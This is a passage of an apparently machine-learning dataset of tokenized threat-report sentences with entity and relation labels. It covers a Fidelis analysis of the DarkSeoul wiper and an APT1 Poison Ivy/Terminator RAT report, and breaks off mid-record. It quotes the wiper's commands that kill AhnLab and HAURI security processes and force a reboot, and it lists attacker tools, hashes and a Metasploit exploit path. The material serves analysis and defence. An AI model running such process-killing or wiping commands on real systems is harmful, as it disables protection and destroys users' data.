"=", "DRIVE_FIXED", ")"], ["CreateThread(NULL", ",", "0", ",", "00401B7A", ",", "0040247C", ",", "0", ",", "&", "tid", ")", "..."], ["Example", "of", "the", "wiper", "finds", "fixed", "drives", "and", "create", "new", "thread", "for", "each", "drive", "."], ["The", "following", "commands", "have", "previously", "been", "reported", "in", "the", "community", ":", "\u201c", "taskkill", "/F", "/IM", "pasvc.exe", "\u201d", "\u201c", "taskkill", "/F", "/IM", "Clisvc.exe", "\u201d", "\"", "shutdown", "-r", "-t", "0", "\""], ["Example", "of", "commands", "run", "by", "the", "malware", "."], ["The", "first", "command", ",", "\u201c", "taskkill", "/F", "/IM"], ["pasvc.exe", "\u201d", ",", "will", "try", "to", "kill", "a", "process", "named", "\u201c", "pasvc.exe", "\u201d", "."], ["This", "process", "is", "associated", "with", "the", "AhnLab", "Policy", "Agent", "process", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems", "Threat", "Advisory", "#", "1008"], ["Page", "3", "of", "5", "Rev.", "2013", "-", "02", "-", "21", "Darkseoul", "/", "Jokra", "Analysis", "And", "Recovery", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1800.652.4020"], ["The", "second", "command", ",", "\u201c", "taskkill", "/F", "/IM", "Clisvc.exe", "\u201d", ",", "will", "try", "to", "kill", "a", "process", "named", "\u201c", "Clisvc.exe", "\u201d", "."], ["This", "process", "is", "associated", "with", "the", "ViRobot", "ISMS", "security", "tool", "from"], ["HAURI", "Inc."], ["The", "third", "command", ",", "\u201c", "shutdown", "-r", "-t", "0", "\u201d", ",", "instructs", "the", "malware", "to", "shutdown", "and", "reboot", "the", "system", "."], ["The", "malware", "shuts", "the", "system", "down", "quickly", "after", "initial", "execution", ",", "it", "was", "found", "to", "finish", "wiping", "in", "ten", "to", "fifteen", "minutes", "in", "our", "tests", "."], ["Due", "to", "the", "speed", "of", "the", "wiping", "it", "was", "very", "easy", "to", "find", "that", "the", "malware", "did", "not", "actually", "wipe", "all", "the", "data", "on", "the", "computer", "."], ["It", "wiped", "just", "enough", "to", "make", "the", "machine", "unusable", "after", "the", "operation", "was", "complete", "."], ["This", "is", "notable", "and", "can", "be", "seen", "in", "the", "operation", "of", "the", "malware", "as", "it", "makes", "sure", "to", "overwrite", "the", "VBR", "first", "then", "continue", "overwriting", "the", "MBR", "and", "other", "files", "."], ["Note", ":", "The", "sample", "Fidelis", "Security", "Systems", "researchers", "had", "available", "looked", "very", "similar", "to", "that", "detailed", "in", "community", "write", "-", "ups", "."], ["However", ",", "as", "of", "the", "date", "of", "this", "post", ",", "researchers", "were", "still", "analyzing", "the", "available", "sample", "."], ["Therefore", ",", "differences", "between", "the", "available", "sample", "and", "others", "available", "to", "the", "community", "may", "become", "apparent", "in", "the", "future", "."], ["File", "System", "Recovery"], ["The", "following", "is", "the", "view", "of", "the", "wiped", "disk", "for", "each", "of", "the", "operating", "systems", "that", "we", "tested", ":", "Example", "of", "wiped", "MBR", "by", "the", "Malware", "."], ["The", "malware", "never", "actually", "overwrote", "the", "backup", "VBR", "."], ["It", "was", "found", "that", "the", "same", "techniques", "utilized", "to", "recover", "data", "from", "Shamoon", "could", "be", "applied", "here", "."], ["The", "recovery", "methods", "were", "covered", "in", "depth", "in", "Fidelis", "Threat", "Advisory", "#", "1007", "so", "we", "will", "not", "show", "them", "here", "."], ["What", "will", "be", "shown", "are", "the", "results", "of", "the", "recovery", "."], ["When", "the", "backup", "VBR", "is", "found", "within", "EnCase", "(", "v6.19.6", ")", "it", "was", "possible", "to", "add", "a", "manual", "NTFS", "partition", "into", "the", "system", "to", "recover", "the", "file", "system", "and", "data", "within", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems", "Threat", "Advisory", "#", "1008"], ["Page", "4", "of", "5", "Rev.", "2013", "-", "02", "-", "21", "Darkseoul", "/", "Jokra", "Analysis", "And", "Recovery", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys", "+1800.652.4020", "Example", "of", "a", "file", "system", "recovered", "Once", "the", "logical", "file", "system", "is", "recovered", "relevant", "forensic", "artifacts", "can", "be", "located", "."], ["It", "will", "be", "important", "to", "note", "that", "a", "lot", "of", "files", "will", "be", "recoverable", "and", "a", "lot", "of", "system", "files", "are", "left", "untouched", "."], ["The", "wiper", "corrupts", "file", "systems", "very", "quickly", ",", "but", "the", "expense", "of", "this", "is", "leaving", "more", "files", "untouched", "and", "recoverable", "."], ["Note", ":", "When", "multiple", "partitions", "are", "suspected", "then", "it", "will", "be", "likely", "the", "recovery", "will", "need", "to", "be", "done", "manually", "with", "a", "hex", "editor", "."], ["The", "method", "for", "this", "was", "also", "covered", "in", "advisory", "#", "1007", "."], ["Using", "a", "hex", "editor", "it", "is", "possible", "to", "repair", "an", "image", "with", "the", "backup", "VBR", "and", "build", "a", "new", "MBR", "to", "boot", "the", "affected", "computer", "."], ["This", "comes", "with", "a", "warning", ",", "just", "being", "able", "to", "boot", "the", "machine", "and", "accessing", "the", "data", "within", "does", "n't", "mean", "that", "system", "will", "operate", "properly", "."], ["The", "system", "still", "has", "files", "that", "were", "corrupted", "by", "the", "malware", ",", "and", "some", "of", "those", "files", "will", "affect", "the", "user", "experience", "."], ["However", ",", "in", "our", "testing", "we", "were", "able", "to", "rebuild", "the", "MBR", "and", "recover", "the", "VBR", "to", "boot", "the", "affected", "system", "."], ["Our", "repaired", "system", "was", "missing", "the", "start", "button", "and", "a", "few", "of", "the", "shortcuts", "to", "executables", "on", "the", "desktop", "were", "no", "longer", "functioning", "."], ["The", "XP", "system", "when", "repaired", "always", "asked", "to", "complete", "a", "chkdisk", "cycle", ",", "and", "on", "the", "whole", "did", "n\u2019t", "operate", "normally", "."], ["The", "Windows", "7", "systems", "that", "were", "affected", "by", "the", "two", "malware", "samples", "did", "not", "experience", "these", "issues", ",", "and", "appeared", "to", "operate", "normally", "."], ["Attempts", "to", "repair", "the", "XP", "system", "with", "the", "windows", "recovery", "CD", "always", "ended", "in", "a", "bluescreen", "error", "before", "the", "operation", "finished", "any", "repairing", "."], ["The", "Fidelis", "Take", "Fidelis", "XPS", "sensors", "detect", "the", "DarkSeoul", "/", "Jokra", "malware", "as", "it", "enters", "the", "network", "as", "\"", "Trojan", ".", "Win32.EraseMBR.b", "\"", "."], ["Fidelis", "XPS", "is", "capable", "of", "detecting", "this", "threat", "regardless", "of", "delivery", "method", "employed", "by", "the", "Threat", "Actors", "responsible", "."], ["Fidelis", "XPS", "can", "detect", "and", "alert", "on", "executables", "such", "as", "the", "DarkSeoul", "malware", "multiple", "layers", "deep", "inside", "of", "zip", "files", ",", "or", "even", "XOR'ed", "inside", "of", "a", "weaponized", "MS", "Office", "document", "or", "Adobe", "PDF", "File", "."], ["The", "Fidelis", "Threat", "Research", "and", "Network", "Forensics", "and", "Incident", "Response", "teams", "will", "continue", "to", "actively", "monitor", "the", "ever", "-", "evolving", "threat", "landscape", "for", "the", "latest", "threats", "to", "our", "customers", "network", "security", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems", "Threat", "Advisory", "#", "1008"], ["Page", "5", "of", "5", "Rev.", "2013", "-", "02", "-", "21", "Darkseoul", "/", "Jokra", "Analysis", "And", "Recovery"]]}, {"vertexSet": [[{"name": "Poison Ivy", "pos": [2, 4], "sent_id": 28, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [4, 6], "sent_id": 57, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [4, 6], "sent_id": 58, "type": "Malware"}], [{"name": "Mandiant", "pos": [2, 3], "sent_id": 88, "type": "Organization"}], [{"name": "February 2013", "pos": [5, 7], "sent_id": 88, "type": "Time"}], [{"name": "Mandiant", "pos": [4, 5], "sent_id": 92, "type": "Organization"}], [{"name": "Poison Ivy", "pos": [4, 6], "sent_id": 93, "type": "Malware"}], [{"name": "China", "pos": [12, 13], "sent_id": 93, "type": "Country"}], [{"name": "Malware.lu CERT", "pos": [6, 8], "sent_id": 100, "type": "Organization"}], [{"name": "Luxembourg", "pos": [22, 23], "sent_id": 100, "type": "Country"}], [{"name": "Poison Ivy", "pos": [5, 7], "sent_id": 117, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [14, 16], "sent_id": 120, "type": "Malware"}], [{"name": "0x000015D0", "pos": [16, 17], "sent_id": 129, "type": "Indicator"}], [{"name": "Poison Ivy", "pos": [26, 28], "sent_id": 129, "type": "Malware"}], [{"name": "Hong Kong", "pos": [10, 12], "sent_id": 135, "type": "Location"}], [{"name": "Poison Ivy", "pos": [11, 13], "sent_id": 142, "type": "Malware"}], [{"name": "113.10.246.0 - 113.10.246.255", "pos": [21, 24], "sent_id": 142, "type": "Address"}], [{"name": "202.65.220.0 - 202.65.220.255", "pos": [30, 33], "sent_id": 142, "type": "Address"}], [{"name": "202.67.215.0 - 202.67.215.255", "pos": [38, 41], "sent_id": 142, "type": "Address"}], [{"name": "210.3.0.0 - 210.3.127.255", "pos": [46, 49], "sent_id": 142, "type": "Address"}], [{"name": "219.76.239.216 - 219.76.239.223", "pos": [55, 58], "sent_id": 142, "type": "Address"}], [{"name": "70.39.64.0 \u2013 70.39.127.255", "pos": [0, 3], "sent_id": 143, "type": "Address"}], [{"name": "Poison Ivy", "pos": [14, 16], "sent_id": 144, "type": "Malware"}], [{"name": "2AM and 10AM from Monday to Saturday", "pos": [6, 13], "sent_id": 150, "type": "Time"}], [{"name": "Poison Ivy", "pos": [0, 2], "sent_id": 157, "type": "Time"}], [{"name": "File management", "pos": [12, 14], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "File search", "pos": [15, 17], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "File transfer", "pos": [18, 20], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "Registry management", "pos": [21, 23], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "Process management", "pos": [24, 26], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "Services management", "pos": [27, 29], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "Remote shell", "pos": [30, 32], "sent_id": 159, "type": "MalwareCharacteristics"}], [{"name": "Screenshot creation", "pos": [0, 2], "sent_id": 160, "type": "MalwareCharacteristics"}], [{"name": "Hash stealing", "pos": [3, 5], "sent_id": 160, "type": "MalwareCharacteristics"}], [{"name": "Audio capture", "pos": [6, 8], "sent_id": 160, "type": "MalwareCharacteristics"}], [{"name": "Andrzej Dereszowski", "pos": [7, 9], "sent_id": 161, "type": "Person"}], [{"name": "SIGNAL 11", "pos": [10, 12], "sent_id": 161, "type": "Organization"}], [{"name": "vulnerability", "pos": [4, 5], "sent_id": 162, "type": "Vulnerability"}], [{"name": "http://dev.metasploit.com/redmine/projects/framework/repository/entry/ modules/exploits/windows/misc/poisonivy_bof.rb", "pos": [6, 16], "sent_id": 165, "type": "Exploit"}], [{"name": "Poison Ivy", "pos": [11, 13], "sent_id": 176, "type": "Malware"}], [{"name": "Camellia", "pos": [0, 1], "sent_id": 177, "type": "Obfuscation"}], [{"name": "John the Ripper", "pos": [9, 12], "sent_id": 191, "type": "Software"}], [{"name": "John the Ripper", "pos": [1, 4], "sent_id": 192, "type": "Software"}], [{"name": "http://www.openwall.com/john/", "pos": [8, 9], "sent_id": 193, "type": "SourceCodeInformation"}], [{"name": "OpenSSL", "pos": [0, 1], "sent_id": 194, "type": "SourceCodeInformation"}], [{"name": "pswpsw", "pos": [4, 5], "sent_id": 203, "type": "Indicator"}], [{"name": "EXITFUNC", "pos": [0, 1], "sent_id": 218, "type": "Payload"}], [{"name": "LHOST", "pos": [1, 2], "sent_id": 218, "type": "Payload"}], [{"name": "LPORT", "pos": [2, 3], "sent_id": 218, "type": "Payload"}], [{"name": "Poison Ivy 2.3.2", "pos": [0, 3], "sent_id": 232, "type": "Malware"}], [{"name": "127.0.0.1", "pos": [2, 3], "sent_id": 240, "type": "Address"}], [{"name": "00:0c:29:c9:86:57", "pos": [3, 6], "sent_id": 249, "type": "Address"}], [{"name": "192.168.164.128", "pos": [2, 3], "sent_id": 250, "type": "Address"}], [{"name": "Poison Ivy", "pos": [4, 6], "sent_id": 253, "type": "Malware"}], [{"name": "proxy server", "pos": [11, 13], "sent_id": 253, "type": "MalwareCharacteristics"}], [{"name": "Poison Ivy", "pos": [21, 23], "sent_id": 288, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [3, 5], "sent_id": 290, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [11, 13], "sent_id": 291, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [7, 9], "sent_id": 296, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [19, 21], "sent_id": 297, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [10, 12], "sent_id": 309, "type": "Malware"}], [{"name": "xport.exe", "pos": [9, 10], "sent_id": 310, "type": "Indicator"}], [{"name": "Poison Ivy", "pos": [15, 17], "sent_id": 312, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [1, 3], "sent_id": 321, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [17, 19], "sent_id": 322, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [10, 12], "sent_id": 323, "type": "Malware"}], [{"name": "Poison Ivy", "pos": [7, 9], "sent_id": 327, "type": "Malware"}], [{"name": "TmUpdate.exe", "pos": [9, 10], "sent_id": 346, "type": "Exploit"}], [{"name": "b31b9dd9d29330917627f9f916987f3c", "pos": [10, 11], "sent_id": 346, "type": "MD5"}], [{"name": "ggg.exe", "pos": [2, 3], "sent_id": 348, "type": "Exploit"}], [{"name": "ggg.exe", "pos": [0, 1], "sent_id": 349, "type": "Exploit"}], [{"name": "1295f4a3659cb481b6ae051b61567d7d", "pos": [0, 1], "sent_id": 350, "type": "MD5"}], [{"name": "ggg64.exe", "pos": [0, 1], "sent_id": 353, "type": "Exploit"}], [{"name": "3fd2c4507b23e26d427f89129b2476ac", "pos": [1, 2], "sent_id": 353, "type": "MD5"}], [{"name": "ggg64.exe", "pos": [0, 1], "sent_id": 354, "type": "Exploit"}], [{"name": "iochttp.exe", "pos": [0, 1], "sent_id": 356, "type": "Exploit"}], [{"name": "a476dd10d34064514af906fc37fc12a3", "pos": [1, 2], "sent_id": 356, "type": "MD5"}], [{"name": "iochttp3.exe", "pos": [9, 10], "sent_id": 357, "type": "Exploit"}], [{"name": "d91a6d50702822330acac8b36b15bb6c", "pos": [10, 11], "sent_id": 357, "type": "MD5"}], [{"name": "ippmin.exe", "pos": [0, 1], "sent_id": 358, "type": "Exploit"}], [{"name": "ffea249e19495e02d61aa52e981cebd8", "pos": [1, 2], "sent_id": 358, "type": "MD5"}], [{"name": "m.exe", "pos": [16, 17], "sent_id": 360, "type": "Exploit"}], [{"name": "5b4d4d6d77954107d927eb1987dd43fb", "pos": [17, 18], "sent_id": 360, "type": "MD5"}], [{"name": "map.exe", "pos": [0, 1], "sent_id": 363, "type": "Exploit"}], [{"name": "266fbfd5cacfcac975e11a3dacd91923", "pos": [0, 1], "sent_id": 364, "type": "MD5"}], [{"name": "nc.exe", "pos": [15, 16], "sent_id": 365, "type": "Exploit"}], [{"name": "ab41b1e2db77cebd9e2779110ee3915d", "pos": [16, 17], "sent_id": 365, "type": "MD5"}], [{"name": "KeyX.exe", "pos": [0, 1], "sent_id": 367, "type": "Exploit"}], [{"name": "3d0760bbc1b8c0bc14e8510a66bf6d99", "pos": [1, 2], "sent_id": 367, "type": "MD5"}], [{"name": "nc1.exe", "pos": [2, 3], "sent_id": 367, "type": "Exploit"}], [{"name": "8be39ba7ced43bef5b523193d94320eb", "pos": [3, 4], "sent_id": 367, "type": "MD5"}], [{"name": "nc2.exe", "pos": [8, 9], "sent_id": 367, "type": "Exploit"}], [{"name": "2937e2b37d8bb3d9fe96ded7e6f763aa", "pos": [9, 10], "sent_id": 367, "type": "MD5"}], [{"name": "putty.exe", "pos": [14, 15], "sent_id": 367, "type": "Exploit"}], [{"name": "9bb6826905965c13be1c84cc0ff83f42", "pos": [15, 16], "sent_id": 367, "type": "MD5"}], [{"name": "xPort.exe", "pos": [19, 20], "sent_id": 367, "type": "Exploit"}], [{"name": "2aabd170dae5982e5d93dc6fd9f2723a", "pos": [20, 21], "sent_id": 367, "type": "MD5"}], [{"name": "pwdump.dll", "pos": [24, 25], "sent_id": 367, "type": "Exploit"}], [{"name": "7a115108739c7d400b4e036fe995519f", "pos": [25, 26], "sent_id": 367, "type": "MD5"}], [{"name": "pwdump.exe", "pos": [0, 1], "sent_id": 368, "type": "Exploit"}], [{"name": "f140e0e9aab19fefb7e47d1ea2e7c560", "pos": [1, 2], "sent_id": 368, "type": "MD5"}], [{"name": "Private", "pos": [0, 1], "sent_id": 370, "type": "Exploit"}], [{"name": "a78cbc7d652955be49498ee9834e6a2d", "pos": [1, 2], "sent_id": 370, "type": "MD5"}], [{"name": "Private", "pos": [0, 1], "sent_id": 372, "type": "Exploit"}], [{"name": "40a3e68eafd50c02b076acf71d1569db", "pos": [1, 2], "sent_id": 372, "type": "MD5"}], [{"name": "Private", "pos": [0, 1], "sent_id": 374, "type": "Exploit"}], [{"name": "5682aa66f0d1566cf3b7e27946943b4f", "pos": [1, 2], "sent_id": 374, "type": "MD5"}], [{"name": "Private", "pos": [0, 1], "sent_id": 376, "type": "Exploit"}], [{"name": "c16269c4a32062863b63a123951166d2", "pos": [1, 2], "sent_id": 376, "type": "MD5"}], [{"name": "Terminator3.6", "pos": [8, 9], "sent_id": 376, "type": "Exploit"}], [{"name": "669cef1b64aa530292cc823981c506f6", "pos": [0, 1], "sent_id": 378, "type": "MD5"}], [{"name": "Shtrace.exe", "pos": [6, 7], "sent_id": 379, "type": "Exploit"}], [{"name": "380fe92c23f2028459f54cb289c3553f", "pos": [7, 8], "sent_id": 379, "type": "MD5"}], [{"name": "EXP.EXE", "pos": [0, 1], "sent_id": 381, "type": "Exploit"}], [{"name": "e258cf52ef4659ed816f3d084b3ec6c7", "pos": [0, 1], "sent_id": 382, "type": "MD5"}], [{"name": "pr.exe", "pos": [1, 2], "sent_id": 388, "type": "Exploit"}], [{"name": "a4ad1d1a512a7e00d2d4c843ef559a7a", "pos": [14, 15], "sent_id": 388, "type": "MD5"}], [{"name": "53b77ada5498ef207d48a76243051a01", "pos": [20, 21], "sent_id": 388, "type": "MD5"}], [{"name": "98a65022855013588603b8bed1256d5e", "pos": [28, 29], "sent_id": 388, "type": "MD5"}], [{"name": "wget.exe", "pos": [5, 6], "sent_id": 389, "type": "Exploit"}], [{"name": "57a9d084b7d016f776bfc78a2e76d03d", "pos": [6, 7], "sent_id": 389, "type": "MD5"}], [{"name": "xForceDel.ex", "pos": [10, 11], "sent_id": 389, "type": "Exploit"}], [{"name": "9fbea622b9a1361637e0b97d7dd34560", "pos": [11, 12], "sent_id": 389, "type": "MD5"}], [{"name": "getos.exe", "pos": [5, 6], "sent_id": 390, "type": "Exploit"}], [{"name": "dump.exe", "pos": [6, 7], "sent_id": 390, "type": "Exploit"}], [{"name": "nltest.exe", "pos": [7, 8], "sent_id": 390, "type": "Exploit"}], [{"name": "71d3f12a947b4da2b7da3bee4193a110", "pos": [8, 9], "sent_id": 390, "type": "MD5"}], [{"name": "Terminator", "pos": [12, 13], "sent_id": 390, "type": "Malware"}], [{"name": "attackers", "pos": [1, 2], "sent_id": 398, "type": "Attacker"}], [{"name": "Poison Ivy", "pos": [9, 11], "sent_id": 398, "type": "Malware"}], [{"name": "private and public companies", "pos": [3, 7], "sent_id": 401, "type": "ExploitTargetObject"}], [{"name": "political institutions", "pos": [8, 10], "sent_id": 401, "type": "ExploitTargetObject"}], [{"name": "activists", "pos": [11, 12], "sent_id": 401, "type": "ExploitTargetObject"}], [{"name": "associations", "pos": [13, 14], "sent_id": 401, "type": "ExploitTargetObject"}], [{"name": "reporters", "pos": [15, 16], "sent_id": 401, "type": "ExploitTargetObject"}], [{"name": "Poison Ivy", "pos": [2, 4], "sent_id": 402, "type": "Malware"}], [{"name": "Terminator RAT", "pos": [2, 4], "sent_id": 430, "type": "Malware"}], [{"name": "Fakem RAT", "pos": [2, 4], "sent_id": 431, "type": "Malware"}], [{"name": "Terminator3.6.exe", "pos": [12, 13], "sent_id": 432, "type": "Exploit"}], [{"name": "Fakem RAT", "pos": [10, 12], "sent_id": 434, "type": "Malware"}], [{"name": "Trendmicro", "pos": [14, 15], "sent_id": 434, "type": "Organization"}], [{"name": "January 2013", "pos": [16, 18], "sent_id": 434, "type": "Time"}], [{"name": "File management", "pos": [9, 11], "sent_id": 484, "type": "MalwareCharacteristics"}], [{"name": "Process management", "pos": [12, 14], "sent_id": 484, "type": "MalwareCharacteristics"}], [{"name": "Shell access", "pos": [15, 17], "sent_id": 484, "type": "MalwareCharacteristics"}], [{"name": "Screenshot", "pos": [0, 1], "sent_id": 485, "type": "MalwareCharacteristics"}], [{"name": "Registry management", "pos": [2, 4], "sent_id": 485, "type": "MalwareCharacteristics"}], [{"name": "Services management", "pos": [5, 7], "sent_id": 485, "type": "MalwareCharacteristics"}], [{"name": "Get information of the infected machine", "pos": [8, 14], "sent_id": 485, "type": "MalwareCharacteristics"}], [{"name": "Keylogger", "pos": [1, 2], "sent_id": 490, "type": "MalwareCharacteristics"}], [{"name": "Dump password hashes in memory", "pos": [0, 5], "sent_id": 491, "type": "MalwareCharacteristics"}], [{"name": "View user\u2019s files", "pos": [6, 10], "sent_id": 491, "type": "MalwareCharacteristics"}]], "labels": [{"r": "P32", "h": 6, "t": 7, "evidence": [93]}, {"r": "P21", "h": 12, "t": 13, "evidence": [129]}, {"r": "P28", "h": 15, "t": 16, "evidence": [142]}, {"r": "P28", "h": 15, "t": 17, "evidence": [142]}, {"r": "P28", "h": 15, "t": 18, "evidence": [142]}, {"r": "P28", "h": 15, "t": 19, "evidence": [142]}, {"r": "P28", "h": 15, "t": 20, "evidence": [142]}, {"r": "P28", "h": 15, "t": 21, "evidence": [142, 143]}, {"r": "P33", "h": 22, "t": 23, "evidence": [144, 150]}, {"r": "P13", "h": 39, "t": 40, "evidence": [176, 177]}, {"r": "P21", "h": 45, "t": 39, "evidence": [176, 203]}, {"r": "P13", "h": 49, "t": 48, "evidence": [218, 232]}, {"r": "P13", "h": 49, "t": 47, "evidence": [218, 232]}, {"r": "P13", "h": 49, "t": 46, "evidence": [218, 232]}, {"r": "P13", "h": 53, "t": 54, "evidence": [253]}, {"r": "P21", "h": 61, "t": 60, "evidence": [309, 310]}, {"r": "P21", "h": 80, "t": 79, "evidence": [358]}, {"r": "P21", "h": 78, "t": 77, "evidence": [357]}, {"r": "P21", "h": 76, "t": 75, "evidence": [356]}, {"r": "P21", "h": 73, "t": 72, "evidence": [353]}, {"r": "P21", "h": 71, "t": 70, "evidence": [349, 350]}, {"r": "P21", "h": 68, "t": 67, "evidence": [346]}, {"r": "P21", "h": 82, "t": 81, "evidence": [360]}, {"r": "P21", "h": 84, "t": 83, "evidence": [363, 364]}, {"r": "P21", "h": 86, "t": 85, "evidence": [365]}, {"r": "P21", "h": 88, "t": 87, "evidence": [367]}, {"r": "P21", "h": 90, "t": 89, "evidence": [367]}, {"r": "P21", "h": 92, "t": 91, "evidence": [367]}, {"r": "P21", "h": 94, "t": 93, "evidence": [367]}, {"r": "P21", "h": 96, "t": 95, "evidence": [367]}, {"r": "P21", "h": 98, "t": 97, "evidence": [367]}, {"r": "P21", "h": 100, "t": 99, "evidence": [368]}, {"r": "P21", "h": 102, "t": 101, "evidence": [370]}, {"r": "P21", "h": 104, "t": 103, "evidence": [372]}, {"r": "P21", "h": 106, "t": 105, "evidence": [374]}, {"r": "P21", "h": 108, "t": 107, "evidence": [376]}, {"r": "P21", "h": 110, "t": 109, "evidence": [376, 378]}, {"r": "P21", "h": 112, "t": 111, "evidence": [379]}, {"r": "P21", "h": 114, "t": 113, "evidence": [381, 382]}, {"r": "P21", "h": 116, "t": 124, "evidence": [388, 390]}, {"r": "P21", "h": 118, "t": 115, "evidence": [388]}, {"r": "P21", "h": 120, "t": 119, "evidence": [389]}, {"r": "P21", "h": 122, "t": 121, "evidence": [389]}, {"r": "P21", "h": 126, "t": 123, "evidence": [390]}, {"r": "P21", "h": 117, "t": 125, "evidence": [388, 390]}, {"r": "P23", "h": 128, "t": 129, "evidence": [398]}, {"r": "P13", "h": 22, "t": 25, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 26, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 27, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 28, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 29, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 30, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 31, "evidence": [144, 159]}, {"r": "P13", "h": 22, "t": 32, "evidence": [144, 160]}, {"r": "P13", "h": 22, "t": 33, "evidence": [144, 160]}, {"r": "P13", "h": 22, "t": 34, "evidence": [144, 160]}, {"r": "P13", "h": 139, "t": 142, "evidence": [434, 484]}, {"r": "P13", "h": 139, "t": 143, "evidence": [434, 484]}, {"r": "P13", "h": 139, "t": 144, "evidence": [434, 484]}, {"r": "P13", "h": 139, "t": 145, "evidence": [434, 485]}, {"r": "P13", "h": 139, "t": 146, "evidence": [434, 485]}, {"r": "P13", "h": 139, "t": 147, "evidence": [434, 485]}, {"r": "P13", "h": 139, "t": 148, "evidence": [434, 485]}, {"r": "P13", "h": 139, "t": 149, "evidence": [434, 490]}, {"r": "P13", "h": 139, "t": 150, "evidence": [434, 491]}, {"r": "P13", "h": 139, "t": 151, "evidence": [434, 491]}], "title": "201303itrustPoisonIvy", "sents": [["Public", "document", "APT1", ":", "technical", "backstage", "malware", "analysis", "General", "information", "Sequence", "number", "002"], ["Version", "1.0", "State", "Final"], ["Approved", "by"], ["Paul", "Rascagn\u00e8res", "Approval", "date", "27/03/2013", "Classification", "Public", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "History"], ["Version", "Date", "Author", "0.1"], ["12/03/2013", "P.", "Rascagn\u00e8res"], ["Document", "creation", "0.2", "13/03/2013", "P.", "Rascagn\u00e8res"], ["Document", "update", "0.3", "14/03/2013", "P.", "Rascagn\u00e8res"], ["Document", "update", "0.4", "15/03/2013", "P.", "Rascagn\u00e8res"], ["Appendix", "creation", "0.5", "17/03/2013", "C.", "Harpes"], ["Proofreading", "0.6", "17/03/2013", "P.", "Rascagn\u00e8res"], ["Screenshot", "modification", "0.7", "24/03/2013", "P.", "Rascagn\u00e8res", "Shellcode", "part", "0.8", "25/03/2013", "P.", "Rascagn\u00e8res", "Corrections", "1.0", "27/03/2013", "P.", "Rascagn\u00e8res", "Final", "version", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Modifications", "Version", "1.0", "Page", "2", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Table", "of", "contents", "1", "Introduction", "............................................................................................................................"], ["5", "1.1", "1.2", "1.3", "1.4", "1.5", "2", "Context", "...................................................................................................................................................."], ["5", "Objectives", "...............................................................................................................................................", "5"], ["Authors", "....................................................................................................................................................", "5"], ["Ethical", "choices", ".......................................................................................................................................", "5"], ["Document", "structure", "..............................................................................................................................."], ["5", "Information", "gathering", ".............................................................................................................", "6", "2.1", "Command", "&", "Control", "scanner", "..............................................................................................................."], ["6", "2.2", "IP", "ranges", "................................................................................................................................................."], ["7", "2.3", "Working", "hours", "........................................................................................................................................"], ["7", "3", "Poison", "Ivy", "...............................................................................................................................", "8", "3.1", "3.2", "3.3", "3.4", "3.5", "4", "Description", ".............................................................................................................................................."], ["8", "Remote", "code", "execution", "vulnerability", "...................................................................................................", "8", "Encryption", "key", "brute", "forcing", "................................................................................................................", "8"], ["Exploitation"], ["............................................................................................................................................."], ["9"], ["Shellcode", ".............................................................................................................................................."], ["11", "Information", "obtained", "on", "the", "C&C", "........................................................................................"], ["12", "4.1", "Infrastructure", "schema", "..........................................................................................................................", "12", "4.2", "Tools", "......................................................................................................................................................", "15", "4.3", "Targets", "..................................................................................................................................................", "16", "5", "Terminator", "RAT", "(", "aka", "Fakem", "RAT", ")", "......................................................................................."], ["18", "5.1", "5.2", "5.3", "5.4", "5.5", "Description", "............................................................................................................................................"], ["18", "Password", "protection", "............................................................................................................................"], ["18", "Features", "and", "usage", ".............................................................................................................................."], ["19", "Scanner", ".................................................................................................................................................", "25"], ["Remote", "code", "execution", "vulnerability", ".................................................................................................", "25", "6", "Conclusion", "............................................................................................................................"], ["27", "Appendix", "......................................................................................................................................", "28"], ["Poison", "Ivy", "exploit", "........................................................................................................................................"], ["28"], ["Camellia", "plugin", "for", "John", "the", "Ripper", ".........................................................................................................."], ["31", "Terminator", "(", "aka", "Fakem", "RAT", ")", "password", "brute", "forcer", "..............................................................................."], ["34", "Terminator", "(", "aka", "Fakem", "RAT", ")", "exploit", "........................................................................................................."], ["35", "Shellcode", "......................................................................................................................................................", "37"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "3", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "List", "of", "figures"], ["Figure", "1", ":", "Attackers", "working", "hours", "..................................................................................................."], ["7", "Figure", "2", ":", "Network", "schema", "............................................................................................................."], ["12", "Figure", "3", ":", "Proxy", "server", "login", "window", ".............................................................................................."], ["13", "Figure", "4", ":", "Poison", "Ivy", "interface", "with", "the", "list", "of", "connected", "machines", "................................................"], ["13", "Figure", "5", ":", "Poison", "Ivy", 